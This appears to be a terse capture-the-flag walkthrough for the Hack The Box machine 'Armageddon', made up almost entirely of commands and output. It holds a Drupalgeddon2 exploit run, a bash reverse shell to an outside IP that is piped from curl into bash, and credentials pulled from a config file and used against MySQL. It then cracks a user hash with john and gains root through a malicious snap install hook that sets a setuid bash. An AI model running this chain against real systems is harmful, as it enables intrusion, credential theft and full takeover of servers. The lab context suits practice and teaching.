----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Armageddon
# 26/3/2023
10.10.10.233

----------------------------------------------------
# nmap
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

----------------------------------------------------
# exploitation
----------------------------------------------------
└─$ searchsploit drupal 7
└─$ searchsploit -m php/webapps/44449.rb
└─$ sudo gem install highline           
└─$ ruby 44449.rb            
└─$ ruby 44449.rb http://10.10.10.233/
we got shell

└─$ nano index.html
bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
└─$ nc -lvnp 443 
└─$ python3 -m http.server 80 
armageddon.htb>> curl http://10.10.16.3:80/index.html | bash

now we have stable shell

----------------------------------------------------
# priv esc
----------------------------------------------------
cd /var/www/html/sites/default

grep -iRn 'password' web.config

      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
booboo           (?)     
└─$ ssh brucetherealadmin@10.10.10.233
booboo
[brucetherealadmin@armageddon ~]$ sudo -l
    (root) NOPASSWD: /usr/bin/snap install *
└─$ sudo apt install snap    
└─$ sudo apt install snapd
└─$ sudo gem install fpm
[brucetherealadmin@armageddon ~]$ cp /usr/bin/bash .
└─$ COMMAND="chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash"                       
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
└─$ python3 -m http.server 80 
[brucetherealadmin@armageddon tmp]$ curl http://10.10.16.3:80/xxxx_1.0_all.snap -o bashh.snap
sudo snap install bashh.snap --dangerous --devmode
[brucetherealadmin@armageddon ~]$ ./bash -p
we are root
GG